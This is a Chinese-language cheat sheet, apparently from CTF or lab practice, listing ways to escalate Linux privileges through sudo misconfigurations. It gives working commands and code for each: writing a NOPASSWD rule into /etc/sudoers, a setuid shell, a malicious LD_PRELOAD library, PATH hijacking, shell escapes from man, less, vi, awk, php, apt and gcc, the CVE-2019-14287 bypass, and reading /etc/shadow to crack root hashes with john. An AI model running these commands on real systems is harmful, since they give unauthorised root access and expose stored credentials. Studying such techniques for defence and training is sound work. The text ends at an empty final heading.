# sudo -l
查看当前用户的特权指令 前提要知道用户名确切的密码
```bash
sudo -l
```
## 情景一
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22657583/1672409802506-fc3d74a5-18ff-45ce-bf56-fba6f174e2ff.png#averageHue=%2343535d&clientId=u9babaaa7-67f1-4&from=paste&height=199&id=u4f627d89&originHeight=249&originWidth=1163&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142913&status=done&style=none&taskId=u12498a91-ea90-464d-b579-9e8688ca2f7&title=&width=930.4)
说明该用户不用密码就能以root身份运行`/home/victor/undefeated_victor`文件,是个好的提权脚本

1. 它说找不到 `**/tmp/challenge**`就给他创建一个
```bash
echo '#!/bin/bash' > /tmp/challenge
echo '/bin/bash' >> /tmp/challenge
chmod +x /tmp/challenge
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22657583/1672410129422-fc19824c-90f6-4858-8f43-b2227c10802e.png#averageHue=%23364d5c&clientId=u9babaaa7-67f1-4&from=paste&height=78&id=u54e9517c&originHeight=97&originWidth=505&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29211&status=done&style=none&taskId=u629309e2-a8ae-4751-8761-e8f1853ed85&title=&width=404)

2. 然后sudo执行文件试试
```bash
sudo /home/victor/undefeated_victor
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22657583/1672410249224-7b0aa12a-4f6f-46bb-ac69-bf35c988a497.png#averageHue=%233f525e&clientId=u9babaaa7-67f1-4&from=paste&height=81&id=uc580cbee&originHeight=101&originWidth=706&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41246&status=done&style=none&taskId=u77d4e529-3f75-4986-9e4a-c4a681f4b09&title=&width=564.8)
拿到root权限了！！！
## 情景二
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22657583/1670828210503-dbb1b8a9-1c6e-43f2-8988-f1deb040a0af.png#averageHue=%232f3f5a&clientId=u1fbdb0a4-07ad-4&from=paste&height=155&id=ubc76ded5&originHeight=194&originWidth=1459&originalType=binary&ratio=1&rotation=0&showTitle=false&size=144495&status=done&style=none&taskId=uc83c6b98-e94d-4b9f-b3dc-69cb9d06f7f&title=&width=1167.2)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22657583/1670828157505-a665f138-7789-426f-8bde-dbb4d6d059fd.png#averageHue=%233a4765&clientId=u1fbdb0a4-07ad-4&from=paste&height=35&id=u2d7f2329&originHeight=44&originWidth=780&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26084&status=done&style=none&taskId=u9bf88e2a-46bf-4f05-9a5d-2f7a57cf286&title=&width=624)
此时如果特权指令可以改写则直接拿下！！！

1. 法一
```bash
echo 'chmod 777 /etc/sudoers && echo "maleus ALL=(ALL)NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /home/maleus/dont_even_bother
```
然后 **sudo**这个命令
```bash
sudo dont_even_bother

sudo su / sudo -s
```

2. 法二
```c
int main(void){

    setuid(0); // root 用户 id
    setgid(0); // root 用户组 id

    execl("/bin/sh", "sh", 0);
    /*
"execl" 是一个 C 库函数，它提供了一种执行程序的方式，其中可以指定程序名和命令行参数。
在上面的代码中，函数 execl 将执行程序 "/bin/sh"，并将字符串 "sh" 作为第一个命令行参数传递给该程序。
第三个参数 0 是一个特殊的值，表示该函数不需要额外的命令行参数。
*/
}
```
## 情景三
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1672908406851-7ec9b033-cba8-4ea2-a64c-bcc236331bd1.png#averageHue=%235b5d64&clientId=u2b063ea2-08e4-4&from=paste&height=134&id=ua1f2a62f&originHeight=167&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26056&status=done&style=none&taskId=u0338d22b-aba7-437a-adf6-416a888c9c6&title=&width=600)
说明权限最高，`sudo`可使用所有的命令
```bash
sudo su # 提权
sudo /bin/bash # 提权
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1672908519376-54d4be53-b7d4-4fc5-b8ab-35e82588d900.png#averageHue=%235c7376&clientId=u2b063ea2-08e4-4&from=paste&height=83&id=ufdb01c94&originHeight=104&originWidth=424&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16100&status=done&style=none&taskId=u4cd1d725-093c-4ed3-bc30-f70d24002d0&title=&width=339.2)
## 情景四
**mv 提权**
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1675513473397-c8a10845-5f65-411a-b8f1-de122f9f277e.png#averageHue=%23555d67&clientId=u460a1ae2-7367-4&from=paste&height=213&id=u927166f0&originHeight=266&originWidth=808&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79383&status=done&style=none&taskId=u12e66aeb-32c0-4d08-b8ef-733893dbdd8&title=&width=646.4)
**意思是该用户可用**`**sudo**`**命令，无需密码就能以root身份执行：**`**mv**`**、**`**tar**`**、**`**chgrp**`**、**`**chown**`
因为 `mv`可以给文件重命名，通过给`su`命令重命名来提权。
```bash
sudo mv /bin/chown /bin/ch_own # chown 改成 ch_own
sudo mv /bin/su /bin/chown # su 改成 chown

sudo chown
# 实际上是执行 sudo su 命令 提权
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1675513985944-2d72e43d-ce99-492a-a15a-ce47e8f1edd0.png#averageHue=%23535860&clientId=u460a1ae2-7367-4&from=paste&height=196&id=u026feb88&originHeight=245&originWidth=633&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72189&status=done&style=none&taskId=u7fadf481-05f7-4a78-bd69-783c31a73b0&title=&width=506.4)
## 情景五
**man 提权**
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1677512491476-5ccc741c-7768-48a5-a4e6-90c82950b841.png#averageHue=%23252830&clientId=u7492d3bb-8557-4&from=paste&height=202&id=u3ec8ea84&originHeight=253&originWidth=956&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51512&status=done&style=none&taskId=ued1034c4-5e58-40e7-9622-8179f7d09af&title=&width=764.8)
直接sudo 执行该程序
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1677512523202-8cb51ca1-9e11-4d56-883e-12f413fcbcd4.png#averageHue=%23272b34&clientId=u7492d3bb-8557-4&from=paste&height=174&id=ue1488e2e&originHeight=218&originWidth=610&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34116&status=done&style=none&taskId=u0ba41a3b-0195-45e8-92c3-e456b65b905&title=&width=488)
发现第三个选项可以接 [command] linux 命令
```bash
sudo /home/anansi/bin/anansi_util manual whoami
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1677513743039-a2d9544e-83f2-46e9-b46c-49e97ac08d0a.png#averageHue=%231f2128&clientId=u7492d3bb-8557-4&from=paste&height=475&id=ubd086c7e&originHeight=594&originWidth=936&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63849&status=done&style=none&taskId=u7c2b1ed0-c90a-445a-a349-6b230c11835&title=&width=748.8)
发现这是`**man**`指令的界面，因为**man**是用**sudo**提权的，所以可以用**man**生成的shell提权
```bash
!/bin/bash
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1677513919819-23d41a0f-40ff-4aca-804b-16a0392b6307.png#averageHue=%2321252f&clientId=u7492d3bb-8557-4&from=paste&height=145&id=ufabcceb4&originHeight=181&originWidth=1012&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24922&status=done&style=none&taskId=uf72fa82d-bd38-4411-97ff-38f4d6baa3c&title=&width=809.6)
**提权成功！！！**
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1677513956537-133ae391-a071-4933-8316-261521064796.png#averageHue=%2322252e&clientId=u7492d3bb-8557-4&from=paste&height=238&id=u4cdab08d&originHeight=297&originWidth=458&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27484&status=done&style=none&taskId=u2cd452ce-48ad-450f-af83-795723b6cc9&title=&width=366.4)
## 情景六： ht 图形化文本编辑器提权
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1677921467495-7b1a5f4e-86ec-49f0-8cc6-d22b4613f1f7.png#averageHue=%23434852&clientId=u09d4793b-913e-4&from=paste&height=156&id=uc5acdb68&originHeight=195&originWidth=898&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57924&status=done&style=none&taskId=u1b0a6647-f1e4-4262-9c95-984a8c785d8&title=&width=718.4)
我们可以`**sudo ht**`以root身份无密码使用**ht**命令
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1677921603862-8be81c56-4ae0-47c2-b75c-c69739539728.png#averageHue=%2354585f&clientId=u09d4793b-913e-4&from=paste&height=157&id=u9ec8bcf2&originHeight=196&originWidth=1401&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43859&status=done&style=none&taskId=u35866f43-dcfb-4559-be63-f92f31e8ff7&title=&width=1120.8)
这个文件可以看出，**ht**是个文本编辑器，所以可以修改**/etc/sudoers**提权！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1677921698864-14005709-3a78-4425-8bbd-1a1ca686fbc9.png#averageHue=%233a7ae7&clientId=u09d4793b-913e-4&from=paste&height=374&id=uba74dac8&originHeight=468&originWidth=808&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37591&status=done&style=none&taskId=u5730abcc-b4f8-4032-8345-ba4bc9c291e&title=&width=646.4)
**ht**通过 `Alt + 首字母`进行选中选项，文本删除操作要把光标移到目标文本首字母再开始删文本。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1677921858846-aa307ca1-3952-4fee-ab32-b445b059a8aa.png#averageHue=%233e80f0&clientId=u09d4793b-913e-4&from=paste&height=194&id=u3e59b997&originHeight=242&originWidth=615&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25088&status=done&style=none&taskId=u91da14b8-d17a-4e42-a626-eecdd7d62ad&title=&width=492)
修改当前用户的**sudo**权限，保存退出
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1677921945591-2f0a6a58-a8b8-4bb1-abda-35b72421b206.png#averageHue=%23565c67&clientId=u09d4793b-913e-4&from=paste&height=137&id=u5a888924&originHeight=171&originWidth=753&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29307&status=done&style=none&taskId=u43d095ad-8bd8-4944-a110-88e405db08b&title=&width=602.4)
提权成功！！！
## 情景七 - php 提权
很常用，也有很多变体，**exec、passthru **等等
```bash
sudo php -r "system('/bin/bash');"

# -r，request
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1679393639884-2cf3bcf3-0e93-4085-8008-7c0181b4b704.png#averageHue=%2357585d&clientId=u9a383795-2256-4&from=paste&height=157&id=u48944b39&originHeight=196&originWidth=1139&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55207&status=done&style=none&taskId=uc0bbd228-acbe-4942-8b61-205e0be20ca&title=&width=911.2)
## 情景七 - setenv 环境变量提权
sudo运行时默认会启用**env_reset**选项将从命令行设置的环境变量复原，因此通常情况下，当使用sudo命令时，通过本地修改环境变量也没法替换目标文件来进行提权，但如果sudo在配置时为用户设置了**SETENV**选项，情况就不一样了。**SETENV**会允许用户禁用**env_reset**选项，允许sudo使用当前用户命令行中设置的环境变量。
**如下图**：sudo允许当前用户以root身份执行一个shell脚本，并为当前用户配置了SETENV，shell脚本是打印syslog最后几行。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1680505005449-55279daa-342e-4d0e-8db1-c70bdf386b6f.png#averageHue=%232a2c35&clientId=u8d06bc3d-128b-4&from=paste&height=123&id=ue56cb67b&originHeight=154&originWidth=1092&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98812&status=done&style=none&taskId=ue497eb2b-f3f2-4f20-becc-c8941e395f2&title=&width=873.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1680506378252-a00f8163-cbd2-4cef-8429-bcf957c37a74.png#averageHue=%232a2c34&clientId=u8d06bc3d-128b-4&from=paste&height=77&id=u01fe78a7&originHeight=96&originWidth=523&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60249&status=done&style=none&taskId=ue681310d-d383-4fb9-b6dc-058f7a17ce6&title=&width=418.4)
如果没有配置**SETENV**，这里是无法通过改环境变量把tail替换成一个vim命令来进行提权的。这里有**SETENV**，那么就可以设置环境变量 **(tail 命令没用绝对路径，可以冒充一波)**。
```bash
ln -s /bin/vi tail  # 给vi编辑器设置 tail 软链接 冒充 tail 命令

# 也可以把 vi 命令 复制到 /tmp 目录中 ，命名为 tail
```
**修改环境变量**
```bash
export PATH=.:$PATH  # 添加当前目录为 $PATH 环境变量
```
**sudo 提权**
```bash
sudo --preserve-env=PATH shell.sh

# --preserve-env 
# 会使用当前新的PATH作为环境变量，并禁用env_reset选项。
# 从而达到先执行我们伪造的tail命令的目的
```
进入`**vi**`编辑模式，再 `**:!/bin/bash**`** 提权成功！**
## 情景八- gcc 提权
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1680753415421-bef04b12-854f-4464-9fc9-875ba7a7c42f.png#averageHue=%23484c53&clientId=ueeb151a7-1155-4&from=paste&height=182&id=u280d478f&originHeight=228&originWidth=1230&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=107792&status=done&style=none&taskId=u450ff04f-88ee-4b3d-94d3-8f624ef1b56&title=&width=984)

1. **读取特权文件**
```bash
LFILE=/etc/sudoers
sudo gcc -x c -E "$LFILE"

sudo gcc -x c -E /etc/shadow

# -x <language>  指定以下输入文件的语言。根据文件的扩展名猜测语言。
# -x c 指定 c 语言编译
# -E  参数指定编译器只进行预处理，不进行编译和链接操作。
# 预处理器主要用于处理源代码中的预处理指令，如 #include 和 #define 等，将它们替换成对应的内容。
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1680754395321-c79f0858-d8a1-46ce-ac2f-67522bdb49d6.png#averageHue=%23382d49&clientId=ueeb151a7-1155-4&from=paste&height=249&id=u2b8157b5&originHeight=311&originWidth=867&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97771&status=done&style=none&taskId=u09131a61-8ea5-461d-85d5-8edab40f431&title=&width=693.6)
文件被读取并解析为文件列表（每行一个），内容被显示为**错误消息**，因此这可能不适合读取任意数据。
```bash
LFILE=/etc/sudoers
sudo gcc @"$LFILE"

sudo gcc @/etc/shadow
# @文件      从 FILE 读取选项
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1680754679090-7d4ab038-6843-4391-82d1-0bac3dce8552.png#averageHue=%233d314b&clientId=ueeb151a7-1155-4&from=paste&height=428&id=u217aa275&originHeight=535&originWidth=953&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=267487&status=done&style=none&taskId=u999eb9ed-0af8-4218-ab59-a9b4364598c&title=&width=762.4)

2. **提权**

如果二进制文件被允许以超级用户身份运行**sudo**，它不会放弃提升的特权，并可用于访问文件系统、升级或维护特权访问。
```bash
sudo gcc -wrapper /bin/bash, -s .
# -wrapper/-wrap 所有命令都在一个包装程序下运行，包括程序和它的参数用逗号分开。

# 使用 /bin/bash 作为包装脚本运行 gcc

# -s 是 wrapper 参数的参数 (bash 的参数): 这是一个选项，告诉包装程序从标准输入读取命令。
# -s 从当前面目录标准输入读取命令。使bash 读取到 EOF 时不会退出
# . gcc 编译当前目录
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1680756683983-5177a00f-7f1f-457c-b5b4-a7bf612bc424.png#averageHue=%23484a4f&clientId=u1f2a9243-7ecc-4&from=paste&height=190&id=u8222c6a1&originHeight=238&originWidth=604&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=73128&status=done&style=none&taskId=ufac78a4e-be54-4a45-befa-8481ef8f746&title=&width=483.2)
**提权成功！！！**
## 情景九 - 提权到高一级的用户
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1681049122725-30577e7d-469c-40ab-af29-319ef77e36a0.png#averageHue=%2326282d&clientId=ub373372b-a98d-4&from=paste&height=67&id=ud3dadb79&originHeight=84&originWidth=811&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18631&status=done&style=none&taskId=u4425aff2-faee-4653-81e9-c326f2768dc&title=&width=648.8)
免密以**brexit**的身份执行 **/bin/bash, **sudo 默认是以** root **用户执行命令，以其他用户执行命令用 **-u **
```bash
sudo -u brexit /bin/bash
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1681049501623-4e8c7841-5de3-4705-951e-7711d1a06de6.png#averageHue=%2326282d&clientId=ub373372b-a98d-4&from=paste&height=119&id=u078aaabf&originHeight=149&originWidth=1079&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54149&status=done&style=none&taskId=u235b59c0-492a-450d-ae9b-c538942f3f2&title=&width=863.2)
提权到了更高级的用户。
## 情景十 - 环境变量与 C 共享库 提权
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1684152233001-fa954054-c89c-4960-97ea-2c4bb35320cc.png#averageHue=%23222435&clientId=u942ef117-22cd-4&from=paste&height=225&id=u6a225cb1&originHeight=281&originWidth=1063&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=220496&status=done&style=none&taskId=u4d9ddcf7-295b-490b-8076-6d3a74a29ad&title=&width=850.4)
> - **env_reset:    **linux 安全机制，执行命令时重置环境变量
> - **env_keep:    **保持原有环境变量，不进行重置
>    - **LD_PRELOAD**:  LinkerDynamic_Preload 预加载动态链接器
> - env_keep+=LD_PRELOAD （加载恶意共享库 提权）:   保持原有环境变量同时 预加载共享库
> - **mail_badpass:  **如果用户在使用 **sudo** 时输入了错误的密码，系统将发送一封电子邮件通知管理员或指定的收件人，以提醒其发生了一次无效的权限认证尝试

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>


// _init() 函数在共享库被加载到进程的虚拟内存空间并准备使用时被调用。
// 可以用来执行一些初始化操作，例如设置全局变量、注册回调函数等。
void _init() {

    /* 它通过调用unsetenv函数来移除LD_PRELOAD环境变量。
    这样做是为了防止其他共享库被预加载。
    从而可能绕过一些安全机制*/
	unsetenv("LD_PRELOAD");

    /* 将有效用户ID（UID）和有效组ID（GID）设置为0，即root用户。
    这样做的目的是获取root用户的特权。 */
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```
生成位置无关的恶意共享库 作为 **Payload**
```bash
gcc -fPIC -shared shell.c -o shell.so -nostartfiles

# -fPIC Position Independent Code  生成位置无关代码
# -shared 指定生成链接库文件，不是可执行文件

# -nostartfiles 告诉GCC不要使用默认的启动文件。
# 启动文件通常包含一些与程序启动相关的初始化代码，
# 但在某些情况下，我们可能希望避免使用默认的启动文件。
```
用 **sudo **将 **LD_PRELOAD **值设置为 **shell.so **文件，执行可用 **sudo **提权的命令进行提权
```bash
sudo LD_PRELOAD=./shell.so more
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1684155587791-fb9adddc-4285-4c7c-a47c-e5d8c29e0b9b.png#averageHue=%23282b3c&clientId=u17fc9aa5-8cea-4&from=paste&height=158&id=u6b04ce66&originHeight=198&originWidth=562&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=84817&status=done&style=none&taskId=u58d3c16c-912d-4b34-b1aa-4a84dc85e7f&title=&width=449.6)
提权成功，因为当执行 **sudo **指令时，系统加载了自定义的恶意共享库，得以提权
## 情景十一 - timedatectl 提权
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685248417232-b22a86b7-73a7-4143-9f5f-e54fa73a619c.png#averageHue=%2321232f&clientId=u8d2d89ad-fcf2-4&from=paste&height=180&id=ub1216815&originHeight=225&originWidth=612&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=99680&status=done&style=none&taskId=u320e0e52-fd7d-4f07-a2db-07d1bbdf7d4&title=&width=489.6)
`**timedatectl**` 是 Linux 系统中的⼀个命令，**⽤于查看和更改系统的时间和⽇期设置**。它是 **systemd** 系统和服务管理器的⼀部分，**可以⽤来查看和更改系统时区、系统时间、RTC 时间（硬件时钟）以及系统时间与 RTC 时间的同步设置等。**
`**list-timezones**` 是 `**timedatectl**` 命令的⼀个选项，**⽤来列出所有可⽤的时区。**当你执⾏ `**timedatectl list-timezones**` 命令时，系统会列出所有 **systemd **所知道的可⽤时区，**这些时区⼀般来⾃于 IANA 时间数据库。**
所以， `**list-timezones**` 是 `**timedatectl**` 的⼀部分，⽤于实现列出所有可⽤时区的功能。
**gtfobins** - 给出提权操作
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685248624679-78233fb5-6908-42e2-9263-a880a6168db7.png#averageHue=%23fcf8f8&clientId=u8d2d89ad-fcf2-4&from=paste&height=196&id=uc003e7b2&originHeight=245&originWidth=1182&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=9387&status=done&style=none&taskId=u767d4a9a-bd3d-42b3-a286-5dd3214d3de&title=&width=945.6)
`**timedatectl**`** **的⼦命令`**list-timezones**`调⽤了`**less**`的机制，所以能够给以 
`**!/bin/bash**`** **的⽅式提权。
```bash
sudo timedatectl list-timezones

# 进入 less 界面
!/bin/sh
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685248728174-d611b995-618b-4889-ad0d-a748f2214e2f.png#averageHue=%2320222f&clientId=u8d2d89ad-fcf2-4&from=paste&height=58&id=u31647fe5&originHeight=73&originWidth=238&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12404&status=done&style=none&taskId=u180c1401-fe59-4d61-8cdf-8f92b6e87af&title=&width=190.4)
提权成功！！！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685248745768-9d69935a-8b31-4230-bbdd-5d0f5108a196.png#averageHue=%231b1d2a&clientId=u8d2d89ad-fcf2-4&from=paste&height=158&id=udde7d72f&originHeight=198&originWidth=516&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=64594&status=done&style=none&taskId=u55ba7db4-8248-4eee-bc8a-165de5d17ef&title=&width=412.8)
## 情景十二 - sudo < 1.8.28 - CVE-2019-14287
```bash
sudo -V | grep version
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685584350592-22ef59c0-4e17-4b1b-94f9-ae38ffd75d9e.png#averageHue=%23242631&clientId=u5c7533cb-daf7-4&from=paste&height=83&id=u125b8586&originHeight=104&originWidth=434&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39772&status=done&style=none&taskId=udd6de91e-ca99-431b-b0d1-31d3883ed50&title=&width=347.2)
sudo 版本低于 **1.8.28**，就会有该漏洞 **CVE-2019-14287**
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685584315698-4256fe55-b6b5-4464-a1fa-d6d9ab2df140.png#averageHue=%231f212f&clientId=u5c7533cb-daf7-4&from=paste&height=185&id=u59bd5bcb&originHeight=231&originWidth=1087&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=150490&status=done&style=none&taskId=u6709c5a0-4912-4ef4-a947-4bf568f45f9&title=&width=869.6)
**(ALL, !root) : **任何用户都可以不需输密码sudo执行 **/bin/bash** 命令，但不能以 **root **身份执行。
```bash
# 以 uid 为 -1 的身份执行命令。事实上，uid 为 -1 是非法的

sudo -u#-1  /bin/bash
```
## 情景十三 - apt、apt-get
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685585308947-ce660836-425d-454f-999c-1f87a0a9c1e1.png#averageHue=%23242632&clientId=u5c7533cb-daf7-4&from=paste&height=138&id=ud5f7f21c&originHeight=172&originWidth=538&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77328&status=done&style=none&taskId=u4de713e6-f6ba-4890-aa8c-b7630d392f5&title=&width=430.4)
```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/bash
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685585267680-31455175-8db4-4eb4-bc5f-500dc22b3ffd.png#averageHue=%23232534&clientId=u5c7533cb-daf7-4&from=paste&height=161&id=u8949a8c1&originHeight=201&originWidth=997&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=161140&status=done&style=none&taskId=u75e6d079-8c18-48b6-b6e5-b8292dee4b3&title=&width=797.6)
## 情景十四 - apache2
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685586434601-5bdcb631-df08-4413-90ea-223752c1453d.png#averageHue=%232e323f&clientId=u5c7533cb-daf7-4&from=paste&height=66&id=ucef223ca&originHeight=83&originWidth=580&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60266&status=done&style=none&taskId=ua2ab395e-f154-4cbc-93eb-5b72f2cc534&title=&width=464)
```bash
sudo /usr/sbin/apache2 -f /etc/shadow

# -f 指定 apache2 的配置文件，
# 这里会报错并泄露 /etc/shadow 的第一行内容，root 的 凭据
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685588443479-147a1f29-2946-4f50-8fa3-fc3b7965e97c.png#averageHue=%235c5d62&clientId=ucb810bc9-7246-4&from=paste&height=157&id=u4e1893da&originHeight=196&originWidth=1835&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78488&status=done&style=none&taskId=u8ddf5296-7b73-45f7-b5d8-f9497601361&title=&width=1468)
`$6$` 是 SHA-512 加密，用 **john **爆破
```bash
john --format=sha512crypt passwd --wordlist=/usr/share/wordlists/rockyou.txt
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685588671149-1b12eeb3-6c3a-4cb7-8c68-3a2518e64581.png#averageHue=%2354555b&clientId=udc675dd6-1ea4-4&from=paste&height=237&id=u9f598786&originHeight=296&originWidth=1080&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=99291&status=done&style=none&taskId=uc1042227-3529-46c1-a0aa-be59fbe1eb6&title=&width=864)
**爆破出 root 密码！**
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685588943494-695b3f01-ced9-43ff-88b1-ce53032b3878.png#averageHue=%2352535a&clientId=udc675dd6-1ea4-4&from=paste&height=135&id=u583d4bd4&originHeight=169&originWidth=553&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37237&status=done&style=none&taskId=u56145db6-d224-4e2f-890e-d854cf3dc7d&title=&width=442.4)
提权成功！！！
## 情景十五 - ash、bash、zsh、dash
ash、bash、zsh、dash 都是 linux shell 环境，直接 **sudo** 提权
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685589084470-30012658-a9dd-492f-a080-531ae5a34252.png#averageHue=%235a5c61&clientId=udc675dd6-1ea4-4&from=paste&height=206&id=u5df501b0&originHeight=258&originWidth=594&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54741&status=done&style=none&taskId=u19bf0d0e-076e-448e-bcb0-0ddfb785cec&title=&width=475.2)
## 情景十六 - awk
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685593439165-2df7562d-522e-4e2e-8ca3-0dbd27d9503f.png#averageHue=%233f414a&clientId=udc675dd6-1ea4-4&from=paste&height=114&id=u22f4aa68&originHeight=142&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63586&status=done&style=none&taskId=u4b9093e9-48a1-4dbd-b2a0-4cccbdfec2c&title=&width=457.6)
### 方法一 - 文件任意读取
```bash
sudo awk '//' /etc/shadow
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685593598127-b9784077-7987-4a91-a2fc-8454e4235a64.png#averageHue=%2340434d&clientId=udc675dd6-1ea4-4&from=paste&height=591&id=u4a3315f8&originHeight=739&originWidth=1623&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=475986&status=done&style=none&taskId=u2afc0909-6df4-4b6a-84b7-0430b774fa3&title=&width=1298.4)
### 方法二 - Begin 模式提权
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
# BEGIN 是 awk 一种特殊模式，表示处理输入流前执行的动作
# 处理输入流前执行系统的 /bin/bash ,以获得提权
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685593905477-050b2519-49aa-4b73-a064-97f133c68b74.png#averageHue=%235a5b61&clientId=udc675dd6-1ea4-4&from=paste&height=154&id=u40b3bf3e&originHeight=192&originWidth=709&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=64025&status=done&style=none&taskId=ue91e7a0e-17b0-4454-81e2-f4422059b99&title=&width=567.2)
## 情景十七 - base64、base16、base32
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685594177794-de481553-e282-4c5c-8ac8-582aec564c91.png#averageHue=%23606166&clientId=udc675dd6-1ea4-4&from=paste&height=73&id=ufe62ba6c&originHeight=91&originWidth=531&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17123&status=done&style=none&taskId=u5b6a11b4-3a87-48a3-b449-75707196546&title=&width=424.8)
可以使用 **base64 **先编码，再解码，以实现任意文件的读取
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685594655107-d57e30fd-f75f-4632-a96e-3b09159ede3f.png#averageHue=%23272a32&clientId=udc675dd6-1ea4-4&from=paste&height=77&id=u7269b1d0&originHeight=96&originWidth=609&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29942&status=done&style=none&taskId=uf79362e3-23ee-4190-aad9-74f307d6d03&title=&width=487.2)
```bash
$GTC_FILE=/etc/shadow

sudo base64 "$GTC_FILE" | base64 -d
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/22657583/1685594453346-98733472-4191-4d0d-9a8e-4fe483c11c16.png#averageHue=%23353844&clientId=udc675dd6-1ea4-4&from=paste&height=627&id=uffd903a7&originHeight=784&originWidth=1624&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=489170&status=done&style=none&taskId=uad3313f5-1d24-4685-88b2-61bbaf8fb4b&title=&width=1299.2)
这样就可以** john** 爆破出 **root** 密码以实现提权。
## 情景十八 - cp
